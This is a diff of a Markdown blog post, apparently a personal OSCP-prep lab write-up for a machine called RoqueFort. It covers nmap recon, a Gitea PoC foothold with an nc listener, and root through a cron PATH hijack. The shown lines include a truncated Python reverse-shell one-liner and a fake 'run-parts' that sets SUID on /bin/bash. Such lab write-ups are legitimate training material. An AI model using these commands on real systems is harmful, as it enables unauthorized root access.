@@ -1,7 +1,7 @@
 ---
 layout: /src/layouts/PostLayout.astro
-title: Lavita
-tags: []
+title: RoqueFort
+tags: ["cron", "priv-esc", "gitea"]
 ---
 **Start 09:47 03-01-2025**
 
@@ -10,9 +10,9 @@ tags: []
 Scope:
 192.168.196.67
 ```
-# Recon
+## Recon
 
-## Nmap
+### Nmap
 
 ```bash
 sudo nmap -sC -sV -oN nmap 192.168.196.67 -T5 -vvvv --min-rate=5000 -sT -p-
@@ -86,9 +86,9 @@ I checked for exploits and found one:
 As for further enumeration I did not find anything useful for the `Dropbear` SSH service.
 
 
-# Initial Foothold
+## Initial Foothold
 
-## 3000/TCP - HTTP
+### 3000/TCP - HTTP
 
 I downloaded the PoC and started modifying it:
 
@@ -106,8 +106,9 @@ I booted up my `nc` listener and got to work.
 
 Unfortunately after the **Succesful login** I got an error.
 
->[!fail]
->I went too fast, the premise is to create an account first.
+:::fail
+I went too fast, the premise is to create an account first.
+:::
 
 I registered a new account:
 
@@ -145,7 +146,7 @@ I then upgraded the shell using `script -c bash /dev/null`:
 ![](../../../assets/fec11203b599639f90c321a9ec36b0e5.png)
 
 
-# Privilege Escalation
+## Privilege Escalation
 
 Now that we have access we can get to enumerating the system and finding a way to exploit it.
 
@@ -169,8 +170,9 @@ As well as:
 
 ![](../../../assets/b9f29aa527753250303754e3bdf1bf85.png)
 
->[!note]
->We see `/usr/bin/local` as an interesting writable directory. It’s also set up in the cron path in the second position.
+:::note
+We see `/usr/bin/local` as an interesting writable directory. It’s also set up in the cron path in the second position.
+:::
 
 I went ahead and enumerated the cron jobs:
 
@@ -178,8 +180,9 @@ I went ahead and enumerated the cron jobs:
 
 ![](../../../assets/eca3adfec6d564bab7cd33dbc229c7fb.png)
 
->[!important]
->At the top we notice the cron job `cd / && run-parts --report /etc/cron.hourly`. This means we could write a `run-parts` executable within `/usr/local/bin` which will then get executed within the hour and give us a `root` shell, as it the cron job is owned by `root`.
+:::important
+At the top we notice the cron job `cd / && run-parts --report /etc/cron.hourly`. This means we could write a `run-parts` executable within `/usr/local/bin` which will then get executed within the hour and give us a `root` shell, as it the cron job is owned by `root`.
+:::
 
 Let's put this in practice:
 
@@ -189,10 +192,11 @@ python3 -c 'import socket,subprocess,os;s=scoket.socket(socket.AF_INET,socket.SO
 
 I made this in my Kali machine, then transferred it over and `chmod 777` the file and then waited for a root shell.
 
->[!fail]
->This took a really long time without any effect, I also tried a `msfvenom` payload to no avail.
+:::fail
+This took a really long time without any effect, I also tried a `msfvenom` payload to no avail.
+:::
 
-## Succesful approach
+### Succesful approach
 
 ```bash
 echo "chmod +s /bin/bash" > run-parts
@@ -206,8 +210,9 @@ We can now go ahead and run `bash -p` to elevate our shell:
 
 ![](../../../assets/f8b033013bf10b5576c87421d1c3fabe.png)
 
->[!success]
->We have FINALLY after many reverts successfully escalated our privileges.
+:::success
+We have FINALLY after many reverts successfully escalated our privileges.
+:::
 
 ### proof.txt
 
@@ -218,8 +223,3 @@ We can now go ahead and run `bash -p` to elevate our shell:
 **Finished 12:01 03-01-2025**
 
 [^Links]: [[OSCP Prep]]  
-
-#cron #priv-esc #gitea 
-
-
-
